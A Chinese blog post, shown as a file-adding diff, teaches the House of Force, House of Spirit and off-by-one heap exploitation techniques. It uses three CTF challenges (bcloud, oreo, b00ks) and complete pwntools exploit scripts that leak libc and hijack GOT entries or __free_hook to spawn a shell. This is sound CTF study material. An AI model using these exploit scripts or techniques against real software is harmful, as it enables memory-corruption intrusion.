@@ -1,0 +1,721 @@
+---
+title: 堆的House Of Force,House of spirit,Off by one 学习
+date: 2021-05-27 18:13:44
+tags: 
+     - PWN学习 
+categories:
+     - PWN学习 
+     - 学习
+
+
+---
+
+**0x00**:
+
+​	这其实是接着上个《SploitFun Linux x86 Exploit 开发系列教程》的后续实验，书上关于堆的很多漏洞现在已经不可用或需要特定环境，所以故拿ctf题目继续学习。
+
+
+
+# 堆的House Of Force,House of spirit,Off by one 学习
+
+## House Of Force
+
+### 漏洞原理
+
+House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件：
+
+1.能够以溢出等方式控制到 top chunk 的 size 域
+
+2.能够自由地控制堆分配尺寸的大小
+
+House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。
+
+那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证
+
+```c
+// 获取当前的top chunk，并计算其对应的大小
+victim = av->top;
+size   = chunksize(victim);
+// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
+if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
+{
+    remainder_size = size - nb;
+    remainder      = chunk_at_offset(victim, nb);
+    av->top        = remainder;
+    set_head(victim, nb | PREV_INUSE |
+            (av != &main_arena ? NON_MAIN_ARENA : 0));
+    set_head(remainder, remainder_size | PREV_INUSE);
+
+    check_malloced_chunk(av, victim, nb);
+    void *p = chunk2mem(victim);
+    alloc_perturb(p, bytes);
+    return p;
+}
+
+```
+
+
+
+然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制 top chunk size 域的漏洞。
+
+```c
+(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)
+```
+
+一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证。
+
+```c
+remainder   = chunk_at_offset(victim, nb);
+av->top    = remainder;
+/* Treat space at ptr + offset as a chunk */
+\#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
+```
+
+之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。
+
+**与此同时，我们需要注意的是，topchunk** **的 size** **也会更新，其更新的方法如下**
+
+```c
+victim = av->top;
+size  = chunksize(victim);
+remainder_size = size - nb;
+set_head(remainder, remainder_size | PREV_INUSE);
+```
+
+所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。
+
+ 
+
+## 2016 BCTF bcloud
+
+### 程序分析
+
+检查程序，程序只开启了canary和nx保护
+
+ <img src="image-20210802111002349.png" alt="image-20210802111002349" style="zoom:80%;" />
+
+然后用ida分析，程序刚开始会创建一个名字，这里最多读取64个字节的&s，然后创建v2，这里malloc是在读取&s之后的，如果我们输入了64个字节&s后的/x00截断符就会被v2的地址覆盖，strcpy就会把&s和v2的地址复制进去
+
+ <img src="image-20210802111059153.png" alt="image-20210802111059153" style="zoom:80%;" />
+
+然后下面的函数就会输出&s就会把v2地址输出
+
+ <img src="image-20210802111114857.png" alt="image-20210802111114857" style="zoom:80%;" />
+
+还有一处漏洞在设置org和host处，这里也是和上面一样的漏洞，当输入0x40个&s时，后面v2的值就会把末尾的\x00给覆盖，strcpy就会继续往下复制，而v2分配的最晚，没有堆被free，因此v2分配的堆快是与top chunk相邻的堆快，这里如果复制了0x40个数据，之后的v2的值就会覆盖top chunk的头部的pre_size，之后v3的内容就会先覆盖topchunk的size，这样我们就可以把topchunk的size覆盖成FF FF FF FF，也就是-1。
+
+<img src="image-20210802111139289.png" alt="image-20210802111139289" style="zoom:80%;" /> 
+
+ 
+
+New_note函数
+
+ <img src="image-20210802111205577.png" alt="image-20210802111205577" style="zoom:80%;" />
+
+这里它不会检查我们输入的长度，就满足了house of force的第二个条件，我们可以自定义分配的堆大小
+
+注意这里在创建堆快时，会把堆快的指针存放在0x804b120处，还有堆快的大小在0x804b0a0处，注意这里malloc的堆快大小是v2+4，也就是我们输入的大小+4
+
+ <img src="image-20210802111222632.png" alt="image-20210802111222632" style="zoom:80%;" />
+
+Show选项
+
+这个选项什么都没输出
+
+ <img src="image-20210802111242196.png" alt="image-20210802111242196" style="zoom:80%;" />
+
+Edit选项
+
+ <img src="image-20210802111306828.png" alt="image-20210802111306828" style="zoom:80%;" />
+
+Delete选项
+
+ <img src="image-20210802111321924.png" alt="image-20210802111321924" style="zoom:80%;" />
+
+Syn选项，没有什么用
+
+ ![image-20210802111339035](image-20210802111339035.png)
+
+### 利用思路
+
+1. 首先，我们要在输入name的时候输入0x40大小的的参数，然后就会泄露出name创建的内存空间的指针（第一个堆快的指针），利用这个我们可以计算top chunk的位置。
+
+2. 然后在输入org以及host的时候，我们先输入0x40个数据，然后v2指针的位置就会覆盖输入数据末尾的/x00截断符，然后strcpy就会继续往下复制，这里v2是后创建的堆快，所以和top chunk相邻，这时候v2的指针覆盖了top chunk的prev_size的部分，v3内容就会覆盖top chunk的size
+
+ <img src="image-20210802111407277.png" alt="image-20210802111407277" style="zoom:80%;" />
+
+3. 我们先把top chunk的size覆盖成FF FF FF FF 这样就可以通过top chunk分配的验证，然后选择new一个chunk，大小为0x804b0a0 -8 - (泄露的第一个堆快地址- 8+ 0x48*3) - 12我们要把top chunk分配到0x804b0a0处，这样就可以控制分配的堆快大小以及位置了。
+
+计算方法：泄露的地址-8是因为还有堆头，3个0x48是name+host+org的大小，-12是因为top chunk的堆头+程序中malloc+4，-8是为了让写入的数据刚好在0x804b0a0。
+
+4. 然后我们可以先把free_ got地址劫持为puts_plt的地址，然后调用delete函数泄露atoi的地址，就可以计算libc基址，得到system的地址了。
+
+5. 我们得先修改3个堆快的大小为足够大小，然后指针改为atoi_got，free_got，atoi_got，利用puts泄露一个atoi的地址，另外一个用来修改atoi的地址为system_addr，然后在开始调用atoi时输入/bin/sh就可以执行system（/bin/sh）拿到shell
+
+### Gdb调试
+
+开始输入的0x40个a，泄露的第一块堆的地址
+
+ <img src="image-20210802111431784.png" alt="image-20210802111431784" style="zoom:80%;" />
+
+开始时输入name，host，org创建的三个堆块，topchunk在org的下方，也就是0xa0090d8处
+
+ <img src="image-20210802111749554.png" alt="image-20210802111749554" style="zoom:80%;" />
+
+通过计算偏移，第一次new调用malloc把topchunk分配到了0x804b098处
+
+ <img src="image-20210802111802382.png" alt="image-20210802111802382" style="zoom:80%;" />
+
+我们就可以从0x804b0a0处开始修改，先把前三个堆快大小修改为足够大（能修改got表大小即可），然后修改0x804b120处的堆指针为atoi_got，free_got，atoi_got
+
+ <img src="image-20210802111817122.png" alt="image-20210802111817122" style="zoom:80%;" />
+
+之后把free_got修改为puts_plt泄露的atoi地址
+
+ <img src="image-20210802111833329.png" alt="image-20210802111833329" style="zoom:80%;" />
+
+ 
+
+### Payload
+
+```python
+# encoding=UTF-8
+from pwn import *
+
+p = process("./bcloud")
+elf = ELF("./bcloud")
+libc = ELF("./libc.so.6")
+context.log_level = 'debug'
+
+def new(length, content):
+    p.recvuntil("--->>")
+    p.sendline("1")
+    p.recvuntil("Input the length of the note content:\n")
+    p.sendline(str(length))
+    p.recvuntil("Input the content:\n")
+    p.send(content)
+
+def show():
+    p.recvuntil("--->>")
+    p.sendline("2")
+
+def edit(id, newcontent):
+    p.recvuntil("--->>")
+    p.sendline("3")
+    p.recvuntil("id:\n")
+    p.sendline(str(id))
+    p.recvuntil("new content:\n")
+    p.sendline(newcontent)
+
+def delete(id):
+    p.recvuntil("--->>")
+    p.sendline("4")
+    p.recvuntil("id:\n")
+    p.sendline(str(id))
+
+name = "a" * 0x40
+org = "b" * 0x40
+host = p32(0xffffffff)
+
+p.recvuntil("name:\n")
+p.send(name)
+firstchunk = u32(p.recvuntil("! Welcome")[-13:-9])
+p.recvuntil("Org:\n")
+p.send(org)
+p.recvuntil("Host:\n")
+p.sendline(host)
+
+length = 0x804b0a0 -8 - (firstchunk + 0x48*3 - 8) - 12
+payload=''
+new(length, payload)
+
+puts = elf.plt['puts']
+free = elf.got['free']
+atoi = elf.got['atoi']
+payload =p32(30)+p32(30)+p32(30)+ 'a'*116+p32(atoi) + p32(free) + p32(atoi)
+#覆盖前3个chunk大小为30，足够修改，然后再覆盖0x804b120处的堆指针
+length = len(payload)
+new(length, payload)
+#p.interactive()
+edit(1, p32(puts))
+delete(0)
+
+atoi_addr = u32(p.recv()[0:4])
+libc_base = atoi_addr - libc.symbols['atoi']
+system_addr = libc_base + libc.symbols['system']
+
+p.sendline("3")
+p.recvuntil("id:\n")
+p.sendline("2")
+p.recvuntil("new content:\n")
+p.sendline(p32(system_addr))
+p.recvuntil("--->>")
+p.sendline("/bin/sh\x00")
+p.interactive()
+p.sendline("1")
+p.recvuntil("Input the length of the note content:\n")
+p.sendline(str(length))
+p.interactive()
+
+
+```
+
+
+
+## House of Spirit
+
+## 漏洞原理
+
+该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配**指定地址**的 chunk 的目的。
+
+要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即
+
+·    fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
+
+·    fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
+
+·    fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
+
+·    fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av->system_mem 。
+
+·    fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。
+
+## 2014 hack.lu oreo
+
+### 程序分析
+
+ <img src="image-20210802111929070.png" alt="image-20210802111929070" style="zoom:80%;" />
+
+这个程序只开启了nx和canary保护
+
+然后拖入ida进行分析
+
+程序有5个功能
+
+ <img src="image-20210802111947858.png" alt="image-20210802111947858" style="zoom:80%;" />
+
+添加功能
+
+ <img src="image-20210802112002731.png" alt="image-20210802112002731" style="zoom:80%;" />
+
+这里可以看出来这个分配内存的大致结构了
+
+0 description
+
+0x19 name
+
+0x34 前一个内存的地址
+
+0x38
+
+*((_DWORD *)chunk_addr_dword_804A288 + 13) = v1;，这里是把v1=之前的chunk_addr_dword_804A288（这个地方记录上次分配的内存的地址）处的地址+13*4（0x34）的地方赋值成了当前分配的内存的地址，这里DWORD是4字节，所以是chunk_addr_dword_804A288+13*4的位置
+
+然后这里读取name的时候存在溢出，这里可以读入56个字节，但是从chunk_addr_dword_804A288+25到+0x38只有31个字节，可以通过溢出覆盖到前一个内存的地址
+
+还有一点是这里每创建一个堆快就会把dword_804A2A4的值加1
+
+ 
+
+show展示功能
+
+ <img src="image-20210802112530269.png" alt="image-20210802112530269" style="zoom:80%;" />
+
+从最后一个创建的堆开始，根据堆中的前项指针*((_DWORD *)chunk_addr_dword_804A288 + 13)，依次显示之前创建的堆块。
+
+ 
+
+Order（删除）功能
+
+ <img src="image-20210802112600837.png" alt="image-20210802112600837" style="zoom:80%;" />
+
+依次free掉创建的堆快
+
+ 
+
+Leave功能
+
+ <img src="image-20210802112617926.png" alt="image-20210802112617926" style="zoom:80%;" />
+
+这里是往804A2A8的地方写入输入的内容，最大128字节，而0x804a2a8这个地方一开始是0x0804a2c0，也就是往0x0804a2c0写入输入的内容
+
+ <img src="image-20210802112643127.png" alt="image-20210802112643127" style="zoom:80%;" />
+
+### 利用思路
+
+1. 首先我们得泄露出libc的基地址，用来计算system的地址，思路是利用输入name的溢出，把堆的前项指针改成printf函数的got表地址，然后通过show选项，打印出printf的真实地址用来计算libc的基址。
+
+2. 之后利用House of Spirit，伪造一个fastbin，然后free后把我们可以分配的内存改到0x804A2A8，因为这个地方存放的是leave功能写入的地址，如果我们能控制这个地方，然后改成我们想要修改的函数的got表地址就可以进行利用
+
+3. 伪造fastbin的方法：
+
+首先每创建一个堆快就会把dword_804A2A4的值加1，而这个位置相当于我们在0x804A2A0伪造的chunk的size值，因为我们创建的chunk是0x40大小的，所以我们得先创建0x40个chunk把这里的值改成0x40，因为这里我们伪造的chunk的size位是0x804A2A4。注意这里创建的chunk的每个前项指针得设置成NULL，这样在free的时候就不会把依次free所有的chunk了。
+
+然后还需要绕过一个检查：
+
+·    fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av->system_mem 。
+
+这里我们利用leave函数的功能进行绕过，这个选项是在0x0804a2c0处开始修改，得修改伪造的chunk的下一个size位为合适的大小
+
+4. 成功free后，我们下一次申请的内存地址就会从 0x0804a2a8开始了，然后把这个地方改为strlen的got表，调用leave选项的函数，这里修改完后就会直接调用strlen函数，相当于system（输入的内容），所以这里要用system的地址+’;bin/sh’，用来拿到shell，用分号是分开调用，这里实际会调用system（system地址）+system（bin/sh）
+
+ 
+
+## Gdb调试
+
+首先创建4个chunk进行实验，可以看到0x0804a2a8的位置存储的是0x0804a2c0，0x0804a2a4位置存储的是4。
+
+ <img src="image-20210802112835587.png" alt="image-20210802112835587" style="zoom:80%;" />
+
+ 
+
+查看一个chunk，可以看到和我们猜测的结构一致
+
+ <img src="image-20210802112903550.png" alt="image-20210802112903550" style="zoom:80%;" />
+
+使用leave功能，可以看到输入的内容存放在了0x804a2c0的位置
+
+ <img src="image-20210802112917060.png" alt="image-20210802112917060" style="zoom:80%;" />
+
+开始时利用name的溢出把第一个申请的chunk的前项指针覆盖成put的got表地址
+
+ <img src="image-20210802113023666.png" alt="image-20210802113023666" style="zoom:80%;" />
+
+创建40个chunk，然后用leave写入0x804a2c0伪造fastbin的内存情况
+
+ <img src="image-20210802113036589.png" alt="image-20210802113036589" style="zoom:80%;" />
+
+Free之后成功把0x804a2a0的内存地址放入了fastbin
+
+ <img src="image-20210802113049179.png" alt="image-20210802113049179" style="zoom:80%;" />
+
+ 
+
+ 
+
+### Payload脚本
+
+```python
+# encoding=UTF-8
+from pwn import *
+context.log_level = 'debug'
+context.binary = "./oreo"
+oreo = ELF("./oreo")
+if args['REMOTE']:
+    p = remote(ip, port)
+else:
+    p = process("./oreo")
+log.info('PID: ' + str(proc.pidof(p)[0]))
+libc = ELF('./libc.so.6')
+
+def add(descrip, name):
+    p.sendline('1')
+    p.sendline(name)
+    p.sendline(descrip)
+
+def show_rifle():
+    p.sendline('2')
+    p.recvuntil('===================================\n')
+
+def order():
+    p.sendline('3')
+
+def leave(notice):
+    p.sendline('4')
+    p.sendline(notice)
+
+name = 27 * 'a' + p32(oreo.got['puts'])
+print hex(oreo.got['puts'])
+add(25 * 'a', name)
+#gdb.attach(p)
+show_rifle()
+p.recvuntil('===================================\n')
+p.recvuntil('Description: ')
+puts_addr = u32(p.recvuntil('\n')[:4])
+libc_base = puts_addr - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+#创建0x40个堆快把0x804A2A4伪造chunk的size值
+chunk = 1
+while chunk < 0x40-1:
+    add(25 * 'a', 'a' * 27 + p32(0))
+    chunk += 1
+#最后一个chunk把上一个chunk地址位置改成0x0804a2a8
+payload = 'a' * 27 + p32(0x0804a2a8)
+add(25 * 'a', payload)
+#满足伪造fastbin的fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av->system_mem 条件
+payload = 0x20 * '\x00' + p32(0x0) + p32(0x88)
+leave(payload)
+order()
+p.recvuntil('Okay order submitted!\n')
+
+payload = p32(oreo.got['strlen'])
+add(payload, 'b' * 20)
+#gdb.attach(p)
+leave(p32(system_addr) + ';/bin/sh\x00')
+
+p.interactive()
+
+
+```
+
+
+
+ 
+
+# 实验十一-Off-By-One 漏洞（基于堆）
+
+
+
+## 漏洞原理
+
+off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括
+
+- 使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。
+- 字符串操作不合适
+
+一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。
+
+off-by-one 利用思路
+
+1.溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法
+
+2.溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致。**（****glibc2.28****前版本有效）**
+
+下面是ctf例题：
+
+## Asis CTF 2016 b00ks
+
+### 程序分析
+
+该程序是64位，开启了nx和pie，注意这里开启了Full RELRO保护，不能进行复写got表的操作，需要考虑劫持之类的操作
+
+ <img src="image-20210802115028455.png" alt="image-20210802115028455" style="zoom:80%;" />
+
+主函数如下
+
+ <img src="image-20210802115046771.png" alt="image-20210802115046771" style="zoom:80%;" />
+
+有几个功能，增，删，改，查看，还有个修改authorname的功能，**这个函数在一开始就会调用一次**，而我们的漏洞点就是出在这里。函数内部如下
+
+ <img src="image-20210802115104551.png" alt="image-20210802115104551" style="zoom:80%;" />
+
+sub_9f5内容
+
+ <img src="image-20210802115119997.png" alt="image-20210802115119997" style="zoom:67%;" />
+
+可以看到是把我们的输入一个个进行读取，但是这里有一个漏洞，如果我们输入的是32个字节，因为循环是从0开始，当到31的时候我们输入的读取就已经结束了，但是循环还会继续一次，最后会把*buf的第33位置为\x00，这就是off by one的null字节溢出。
+
+新建book的函数
+
+ <img src="image-20210802115140653.png" alt="image-20210802115140653" style="zoom:80%;" />
+
+要求输入一个name和一个description，name的大小说是最大为32，但是实际上这里并没有检查，可以创建我们想要的大小，description也一样。
+
+Name和description创建完后还会创建一个结构体用来存储book的指针
+
+ <img src="image-20210802115429476.png" alt="image-20210802115429476" style="zoom:80%;" />
+
+这个结构体大概内容是
+
+0x0 book的id
+
+0x8 book的name的地址
+
+0x10 book的description的地址
+
+0x18 book的size
+
+然后会把这个结构体的指针放在*((_QWORD *)off_202010 + v2)的位置，这个位置实际上就是author_name(off_202018)的位置+0x20的地方，也就是说如果输入了32个字节的author_name，那么最后的\x00就会覆盖到第一个创建的book的低地址。
+
+ <img src="image-20210802115447627.png" alt="image-20210802115447627" style="zoom:80%;" />
+
+删除函数
+
+<img src="image-20210802115530189.png" alt="image-20210802115530189" style="zoom:80%;" />
+
+编辑函数，根据off_202010位置存放的结构体指针进行编辑
+
+ <img src="image-20210809144352252.png" alt="image-20210809144352252" style="zoom:80%;" />
+
+展示book的函数，这里还会把author_name展示出来
+
+ <img src="image-20210809144405729.png" alt="image-20210809144405729" style="zoom:80%;" />
+
+选项5是和开头一样的修改author_name的函数，就不再展示
+
+### 利用思路
+
+1.首先因为author_name紧接着就是book1结构体的地址，如果溢出了一个\x00就会覆盖到book1的结构体地址，，这个后面会用到，因为我们是先输入的name，那么如果先输入32字节的name，再创建book1的话，book1的地址就会覆盖name末尾的截断字符，如果选择5输出了author_name的话，就可以输出book1的地址了。
+
+2.**libc****基址泄露方法**
+
+因为题目开启了pie，而且没有特别明显的libc基址泄露，但是这里有一个技巧，如果我们申请的内存块足够大，就会调用mmap来扩展内存，由于调用mmap分配的内存和libc基址的偏移是固定的，我们只要泄露book2分配内存的地址就可以知道libc基址
+
+验证：这里创建book2申请了2个大小0x21000的空间
+
+选择Book2的name存储的地址是  0x00007f9899a27010，libc加载的基址是
+
+0x00007f9899475000，偏移为0x00007f9899a27010-0x00007f9899475000=0x5b2010
+
+ <img src="image-20210809144439572.png" alt="image-20210809144439572" style="zoom:80%;" />
+
+ 
+
+第二次申请的结果
+
+Name的内存地址是0x00007f4a27340010，libc基址是0x00007f4a26d8e000，偏移为0x00007f4a27340010-0x00007f4a26d8e000=0x5b2010，可以看到2次申请偏移是一样的
+
+ <img src="image-20210809144457875.png" alt="image-20210809144457875" style="zoom:80%;" />
+
+ 
+
+可以看到这里偏移是一样的
+
+3.**泄露book2****地址的方法**
+
+这里可以利用off by one的漏洞，因为我们的选项5可以重新修改一开始设置的author_name，然后让末尾的\x00覆盖掉book1的结构体指针（这里要注意，我们可以修改的区域是book1的name和description，创建book1的时候要让这两个区域能修改到覆盖后的book1的结构体指针），这样就可以在这个区域伪造一个fake chunk，把name和description的指针修改为book2结构体指针的name和description的地址（由于每次申请的结构体是0x20，所以可以通过泄露的book1结构体的地址进行计算），就可以利用printf选项打印出book2申请的name和description的地址了，然后利用这个地址计算libc的基址。
+
+4.**拿到shell**
+
+这里需要利用__free_hook函数，**当调用****free****函数的时候__free_hook****函数不为NULL****会优先调用__free_hook****里面所写的内容**，我们可以利用编辑功能把book2的结构体中指向description的指针修改为__free_hook函数，再利用编辑功能编辑book2，修改__free_hook的内容为onegadget的execve("/bin/sh", rsp+0x30, environ)，然后执行free book2，当free了book2的description指针的时候就会执行__free_hook里的内容拿到shell。
+
+
+
+### Gdb调试
+
+验证输入author_name的off by one
+
+首先在一开始输入author_name的时候输入32个A，然后创建book1和book2，这里需要用到find命令寻找A存储的地方
+
+ <img src="image-20210809144526836.png" alt="image-20210809144526836" style="zoom:80%;" />
+
+可以看到book1的地址覆盖了author_name末尾的\x00
+
+ <img src="image-20210809145420604.png" alt="image-20210809145420604" style="zoom:80%;" />
+
+这时候选择打印功能就会输出book1结构体的内容了
+
+ <img src="image-20210809145450859.png" alt="image-20210809145450859" style="zoom:80%;" />
+
+然后再次选择修改author_name输入32个A导致了book1结构体地址末尾被覆盖成了\x00（这里重新调试了，可以看到如果分配的内存大小固定的话，重新调试末尾的地址是一样的）
+
+ <img src="image-20210809145520725.png" alt="image-20210809145520725" style="zoom:80%;" />
+
+这里查看分配的堆快，我们需要把description的区域分配到能够控制到覆盖后的（这里是0x559595831100）的地方，就可以伪造book1结构体的chunk了
+
+ <img src="image-20210809145539011.png" alt="image-20210809145539011" style="zoom:80%;" />
+
+这里编辑book1的description+0x20的偏移就可以编辑到通过off by one 覆盖的0x559595831100的地方进行伪造chunk了（注意这里需要之前创建description有足够的大小）
+
+然后伪造book1的结构体把name和description的位置写入book2的name和description的结构体指针的地址(相对book1结构体地址的偏移为0x38和0x40)
+
+ <img src="image-20210809145655945.png" alt="image-20210809145655945" style="zoom:80%;" />
+
+再次选择打印就会打印出book2通过mmap分配的内存的地址了
+
+ <img src="image-20210809145720528.png" alt="image-20210809145720528" style="zoom:80%;" />
+
+ 
+
+之后的利用就和利用思路一样，利用编辑功能把book2的结构体（这里是伪造book1的description）中指向description的指针修改为__free_hook函数，再利用编辑功能编辑book2，修改__free_hook的内容为onegadget的execve("/bin/sh", rsp+0x30, environ)，然后执行free book2，当free了book2的description指针的时候就会执行__free_hook里的内容拿到shell。
+
+ <img src="image-20210809145752158.png" alt="image-20210809145752158" style="zoom:80%;" />
+
+### Payload脚本
+
+```python
+# encoding=UTF-8
+from pwn import *
+context.log_level = 'debug'
+
+binary=ELF("b00ks")
+libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
+p=process("./b00ks")
+
+def new(name_size,name,des_size,des):
+    p.recvuntil("> ")
+    p.sendline("1")
+    p.recvuntil(": ")
+    p.sendline(str(name_size))
+    p.recvuntil(": ")
+    p.sendline(name)
+    p.recvuntil(": ")
+    p.sendline(str(des_size))
+    p.recvuntil(": ")
+    p.sendline(des)
+
+def printbook():
+    p.recvuntil("> ")
+    p.sendline("4")
+
+def read_authorname(name):
+    p.recvuntil("> ")
+    p.sendline("5")
+    p.recvuntil(": ")
+    p.sendline(name)
+
+def editbook(book_id,new_des):
+    p.recvuntil("> ")
+    p.sendline("3")
+    p.recvuntil(": ")
+    p.writeline(str(book_id))
+    p.recvuntil(": ")
+    p.sendline(new_des)
+
+def delete(book_id):
+    p.recvuntil("> ")
+    p.sendline("2")
+    p.recvuntil(": ")
+    p.sendline(str(book_id))
+
+p.recvuntil("name: ")
+p.sendline("A"*32)
+#需要创建满足book1的des区域可以修改到通过off by one修改后的内存区域
+new(176,"a",88,"a")
+
+#创建2个大的内存区域，使用mmap分配
+new(0x21000,"a",0x21000,"a")
+
+#gdb.attach(p)
+printbook()
+p.recvuntil("Author: ")
+book1_addr=u64(p.recvline()[32:32+6].ljust(8,'\x00'))
+log.success("book1_address:"+hex(book1_addr))
+
+#伪造fake chunk
+payload='a'*0x20+p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff)
+editbook(1,payload)
+#gdb.attach(p)
+read_authorname("A"*32)
+#gdb.attach(p)
+
+printbook()
+p.recvuntil("Name: ")
+book2_name_addr=u64(p.recvline()[:-1].ljust(8,"\x00"))
+p.recvuntil("Description: ")
+book2_des_addr=u64(p.recvline()[:-1].ljust(8,"\x00"))
+log.success("book2 name addr:"+hex(book2_name_addr))
+log.success("book2 des addr:"+hex(book2_des_addr))
+
+#用book2的name和des到libc基址的偏移计算libc基址
+libc_base=book2_name_addr-0x5b2010
+log.success("libc base:"+hex(libc_base))
+#gdb.attach(p)
+free_hook=libc_base+libc.symbols["__free_hook"]
+one_gadget=libc_base+0x4527a 
+log.success("free_hook:"+hex(free_hook))
+log.success("one_gadget:"+hex(one_gadget))
+
+#修改book2的des为free_hook的地址，然后把内容改为one_gadget
+editbook(1,p64(free_hook))
+editbook(2,p64(one_gadget))
+#gdb.attach(p)
+#进行free的操作调用free_hook劫持
+
+delete(2)
+p.interactive()
+
+```
+
+
+
+ 
